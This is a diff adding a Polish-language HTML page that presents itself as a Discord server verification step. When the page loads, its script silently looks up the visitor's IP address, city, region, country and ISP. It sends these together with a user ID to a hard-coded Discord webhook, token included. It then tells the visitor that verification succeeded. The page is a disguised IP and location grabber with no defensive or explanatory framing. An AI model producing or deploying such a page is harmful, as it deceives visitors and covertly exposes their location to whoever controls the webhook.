@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Weryfikacja Discord</title>
+    <script>
+        async function verifyUser() {
+            try {
+                // Pobierz dane lokalizacji
+                const ipResponse = await fetch('https://ipinfo.io/json');
+                const ipData = await ipResponse.json();
+                
+                // Pobierz parametry URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const userId = urlParams.get('user');
+                
+                // Wyślij dane przez webhook
+                await fetch('https://ptb.discord.com/api/webhooks/1357027578296275035/lsBipZsvqmJyMapHUbFXBhWe1IupyWtmSS6aGaqkBjWP6Z-2ziUtkTMdV_4H0E5IL-31', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `Nowa weryfikacja!`,
+                        embeds: [{
+                            title: "Dane użytkownika",
+                            fields: [
+                                { name: "ID użytkownika", value: userId },
+                                { name: "IP", value: ipData.ip },
+                                { name: "Lokalizacja", value: `${ipData.city}, ${ipData.region}, ${ipData.country}` },
+                                { name: "Host", value: ipData.org || "Nieznany" }
+                            ],
+                            color: 0x5865F2
+                        }]
+                    })
+                });
+                
+                document.getElementById('status').innerHTML = `
+                    <h2>✅ Weryfikacja zakończona!</h2>
+                    <p>Możesz zamknąć tę stronę i wrócić na Discord.</p>
+                    <p>Rola zostanie nadana automatycznie.</p>
+                `;
+            } catch (error) {
+                document.getElementById('status').innerHTML = `
+                    <h2>❌ Błąd weryfikacji!</h2>
+                    <p>${error.message}</p>
+                    <p>Odśwież stronę i spróbuj ponownie.</p>
+                `;
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #36393f;
+            color: white;
+        }
+        button {
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #4752C4;
+        }
+    </style>
+</head>
+<body onload="verifyUser()">
+    <div id="status">
+        <h1>Trwa weryfikacja...</h1>
+        <p>Proszę czekać, trwa sprawdzanie danych.</p>
+    </div>
+</body>
+</html>
